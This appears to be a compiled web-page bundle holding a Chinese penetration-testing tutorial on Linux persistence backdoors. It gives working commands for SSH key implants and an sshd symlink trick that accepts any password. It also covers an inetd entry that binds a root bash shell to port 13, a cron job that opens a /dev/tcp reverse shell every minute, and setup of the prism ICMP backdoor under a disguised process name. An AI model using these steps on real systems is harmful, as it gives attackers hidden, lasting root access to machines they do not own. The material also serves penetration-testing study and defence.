"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[874],{81021:(i,s)=>{s.A=(i,s)=>{const a=i.__vccOpts||i;for(const[i,t]of s)a[i]=t;return a}},61687:(i,s,a)=>{a.r(s),a.d(s,{comp:()=>v,data:()=>F});var t=a(6254);const e=a.p+"assets/img/image-20241031142229-wn8tc7z.3a8b7d5b.png",n=a.p+"assets/img/image-20241031142615-x27vhc3.cf2827c2.png",l=a.p+"assets/img/image-20241031142905-pkhvghv.521d545e.png",h=a.p+"assets/img/image-20241031143100-72e611w.a3fdf10e.png",p=a.p+"assets/img/image-20241031154509-wyl56k4.b7d0f1c0.png",k=a.p+"assets/img/image-20241031154313-cyj5o3l.52c74859.png",r=a.p+"assets/img/image-20241031162020-j50ymxj.3df038cd.png",d=a.p+"assets/img/image-20241031163049-z5upwdy.7101afc9.png",g=a.p+"assets/img/image-20241031163023-kt3z806.19011c3c.png",o=a.p+"assets/img/image-20241031151955-a4qx1nu.abf12a7b.png",c=a.p+"assets/img/image-20241031152026-2xpmy6x.58ade59d.png",y=a.p+"assets/img/image-20241031175330-x20v5fg.7c5f460f.png",A=a.p+"assets/img/image-20241031164048-mszbixj.545a9fbf.png",m=a.p+"assets/img/image-20241031164233-944f79q.14bfc5f4.png",B=a.p+"assets/img/image-20241031165331-ehigiv6.d5d01254.png",u=a.p+"assets/img/image-20241031183210-yyk386b.9017eaae.png",b={},v=(0,a(81021).A)(b,[["render",function(i,s){return(0,t.uX)(),(0,t.CE)("div",null,s[0]||(s[0]=[(0,t.Fv)('<h2 id="ssh公钥免密后门" tabindex="-1"><a class="header-anchor" href="#ssh公钥免密后门"><span>ssh公钥免密后门</span></a></h2><h3 id="公钥私钥原理概述" tabindex="-1"><a class="header-anchor" href="#公钥私钥原理概述"><span>公钥私钥原理概述</span></a></h3><p>公钥和私钥同时生成，<strong>公钥用于加密，私钥用于解密</strong>。公钥可以有很多人持有，但是私钥只能自己持有，在ssh服务中，将客户端生成的ssh公钥写到目标服务器的 ~/.ssh/authorized keys中,之后客户端利用私钥完成认证即可登录 <span data-type="text" style="color:var(--b3-font-color8);">该后门比较容易被发现(查看/root/.ssh/有几个公钥)。</span></p><p>★ ssh连接，对方开启ssh需要对方密码才可登录，但如果写入公钥，不用密码就可以登录。</p><h3 id="ssh公钥免密实现步骤" tabindex="-1"><a class="header-anchor" href="#ssh公钥免密实现步骤"><span>ssh公钥免密实现步骤</span></a></h3><p>生成公钥/私钥对——&gt; 公钥复制到目标机中——&gt; 更改authorized_keys的权限为 600 ——&gt; 登录目标机</p><ol><li><p>在攻击机上生成公钥/私钥对 在中途会让输入密钥对的密码，由于需要实现免密登录，<span data-type="text" style="color:var(--b3-font-color8);">所以3次回车跳过即可</span></p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ssh</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">keygen </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">t rsa</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+e+'" alt="image" loading="lazy">​</p></li><li><p>将攻击机 .ssh 目录下的 id_rsa.pub 复制到目标服务器的 /root/.ssh/authorized keys 文件里</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">scp </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">~/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.ssh</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">id_rsa.pub root</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.72.56:</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">root</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.ssh</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">authorized_keys</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+n+'" alt="image" loading="lazy">​</p></li><li><p>在目标服务器中，将authorized keys的权限改为600</p><p>​<img src="'+l+'" alt="image" loading="lazy">​</p></li><li><p>尝试是否可以不使用密码就登录到目标服务器</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p></li></ol><h2 id="ssh软连接后门" tabindex="-1"><a class="header-anchor" href="#ssh软连接后门"><span>ssh软连接后门</span></a></h2><h3 id="ssh软连接后门原理" tabindex="-1"><a class="header-anchor" href="#ssh软连接后门原理"><span>ssh软连接后门原理</span></a></h3><p>sshd服务<span data-type="text" style="color:var(--b3-font-color8);">启用PAM认证机制</span>，在/etc/ssh/sshd_config文件中，设置UsePAM 为yes。如果不启用PAM，系统严格验证用户密码，不能建立后门。</p><p>在/etc/pam.d/目录下，对应文件里包含&quot;auth sufficient pam_rootok.so&quot;配置，<span data-type="text" style="color:var(--b3-font-color8);">只要PAM配置文件中包含此配置即可SSH任意密码登录</span>。</p><p>对比一下/etc/pam.d/sshd配置文件和/etc/pam.d/su配置文件，不难发现，前者没有包含如上配置，而后者包含该配置。</p><p>直接启动/usr/sbin/sshd,默认使用/etc/pam.d/sshd的pam配置文件，因而不能建立任意密码登录的后门。</p><p>而通过软链接的方式，实质上PAM认证是通过软链接的文件名（如：/tmp/su,/home/su），在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)。</p><h3 id="ssh软连接后门制作" tabindex="-1"><a class="header-anchor" href="#ssh软连接后门制作"><span>ssh软连接后门制作</span></a></h3><ol><li><p>创建软连接 设置监听端口号</p><p>因为本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口进行伪装。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ln </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sf </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sbin</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sshd </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">su </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">su </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">oPort</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">8888</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+p+'" alt="image" loading="lazy">​</p></li><li><p>尝试使用ssh连接目标服务器，使用<span data-type="text" style="color:var(--b3-font-color8);">任意密码</span>都可以登录 。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ssh root</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.72.56 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">p </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">8080</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+k+'" alt="image" loading="lazy">​</p></li></ol><h2 id="inetd-xinetd-后门" tabindex="-1"><a class="header-anchor" href="#inetd-xinetd-后门"><span>inetd/xinetd 后门</span></a></h2><p>监听外部网络请求(socket)的系统守护进程，当 inetd 接收到一个外部请求后,会根据这个请求到自己的配置文件中去找到实际处理它的程序再把接收到的socket交给那个程序处理</p><p><span data-type="text" style="color:var(--b3-font-color8);">inetd，也叫作“超级服务器”，就是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。</span></p><p>inetd.conf则是inetd的配置文件。inetd.conf文件告诉inetd监听哪些网络端口，为每个端口启动哪个服务。</p><p>位置是/etc/inetd.conf 配置格式</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [service_name] [sock_type] [proto] [flags] [user] [server_path] [args]</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#[服务名称][协议(tcp或udp)] [标 志(wait或 nowait)][属主][真实服务程序全路径][真实服务程序名称及参数]</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ol><li><p>inetd.conf配置 如果配置打开没有，就说明没有这服务，没有就不能使用，也不能在对方机子下载。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">vi </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">etc</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">inetd.conf</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">daytime stream tcp nowait root </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">bin</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">bash bash </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">i   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#插入此行</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+r+'" alt="image" loading="lazy">​</p></li><li><p>启动服务​<img src="'+d+'" alt="image" loading="lazy">​</p></li><li><p>在攻击机直接访问进入root <span data-type="text" style="color:var(--b3-font-color8);">端口默认为13</span></p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">nc targetIP </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">13</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+g+'" alt="image" loading="lazy">​</p></li></ol><h2 id="crontab-计划任务后门" tabindex="-1"><a class="header-anchor" href="#crontab-计划任务后门"><span>Crontab 计划任务后门</span></a></h2><p>Crontab 命令被用来提交和管理用户的需要周期性执行的任务,与windows下的计划任务类似</p><p>当安装完成操作系统后，默认会安装此服务工具,并且会自动启动 crond 进程，<span data-type="text" style="color:var(--b3-font-color8);">crond 进程每分钟会定期检查是否有要执行的任务</span>，如果有要执行的任务，则自动执行该任务.</p><p>相关命令</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">crontab [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">u user]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">e      </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 编辑某个用户的crontab文件内容 </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">crontab [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">u user]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-|</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">      # 显示某个用户的crontab文件内容 </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">crontab [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">u user]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i]r   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#从/var/spool/cron目录中删除某个用户的crontab文件,-i参数指定在删除用 户的crontab文件时是否有确认提示</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li><p>在目标机中设置计划任务 设置每分钟进行一次端口反弹</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">crontab </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">e</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">*/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> *</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> *</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> *</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> *</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> bash </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dev</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tcp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.152.213</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">6666</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+o+'" alt="image" loading="lazy">​</p></li><li><p>在攻击机中进行监听</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><h2 id="prism后门" tabindex="-1"><a class="header-anchor" href="#prism后门"><span>prism后门</span></a></h2></li></ol><p>项目地址 : <a href="https://github.com/andreafabrizi/prism" target="_blank" rel="noopener noreferrer">https://github.com/andreafabrizi/prism</a></p><p>是Linux下的ICMP反弹后门工具，使用时将会在<span data-type="text" style="color:var(--b3-font-color8);">后台等待特定的主机/端口连接信息的ICMP数据包</span> 主动监听连接</p><ol><li><p>克隆到攻击机</p></li><li><p>配置prism.c文件，修改宏定义部分</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">40</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #ifdef STATIC</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">41</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # define REVERSE_HOST     &quot;10.0.0.1&quot;  //连接到主控机的IP地址</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">42</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # define REVERSE_PORT     19832   //连接到主控机的端口号</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">43</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # define RESPAWN_DELAY    15  //后门机尝试连接的空闲时间间隔</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">44</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #else</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">45</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # define ICMP_PACKET_SIZE 1024  //ICMP数据包的大小</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">46</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # define ICMP_KEY         &quot;linger&quot;  //连接的密码</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">47</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #endif</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">48</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">49</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #define VERSION          &quot;0.5&quot;   //版本信息</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">50</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #define MOTD             &quot;PRISM v&quot;VERSION&quot; started\\n\\n# &quot;  //后门机连接时显示的消息</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">51</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #define SHELL            &quot;/bin/sh&quot;  //shell执行的位置</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">52</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #define PROCESS_NAME     &quot;udevd&quot;   //创建的进程名称</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+y+'" alt="image" loading="lazy">​</p></li><li><p>编译 prism.c 文件 <span data-type="text" style="color:var(--b3-font-color8);"> 为了防止环境问题，可以上传到靶机再编译。</span></p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">gcc </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">DDETACH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Wall </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">s </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">o prism prism.c</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+A+'" alt="image" loading="lazy">​</p></li><li><p>编译完成后，可以查看 prism后门的配置信息</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">prism Inf0    </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># I大写  0</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+m+'" alt="image" loading="lazy">​</p></li><li><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> scp 【本地要上传文件地址】  [用户名]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[ip地址]：远程地址</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+B+'" alt="image" loading="lazy">​</p></li><li><p>上传到靶机之后--需要启动才能成功</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">prism</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>在攻击机使用sendPacket.py脚本发送包到后门主机激活，本地监听相关端口等待后门主机反弹连接</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">nc </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">lvvp </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">19832</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    #监听的端口要和prism里配置的一致  </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">python2 .</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sendPacket.py </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.72.56 p4ssw0rd </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.72.36 </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">19832</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 被攻击IP地址 连接密码 攻击者IP地址 回连端口</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li></ol><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><p>注意：</p><ol><li>被攻击端需要启动后门 ./prism 才能成功</li><li>最后一步先监听再发送请求包</li></ol><p>‍</p>',36)]))}]]),F=JSON.parse('{"path":"/perm/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html","title":"Linux权限维持","lang":"zh-CN","frontmatter":{"title":"Linux权限维持","index":true,"icon":"l","isOriginal":true,"date":"2023-09-01T00:00:00.000Z","order":1,"category":["渗透测试"],"tag":["渗透测试","Linux权限维持"],"description":"ssh公钥免密后门 公钥私钥原理概述 公钥和私钥同时生成，公钥用于加密，私钥用于解密。公钥可以有很多人持有，但是私钥只能自己持有，在ssh服务中，将客户端生成的ssh公钥写到目标服务器的 ~/.ssh/authorized keys中,之后客户端利用私钥完成认证即可登录 该后门比较容易被发现(查看/root/.ssh/有几个公钥)。 ★ 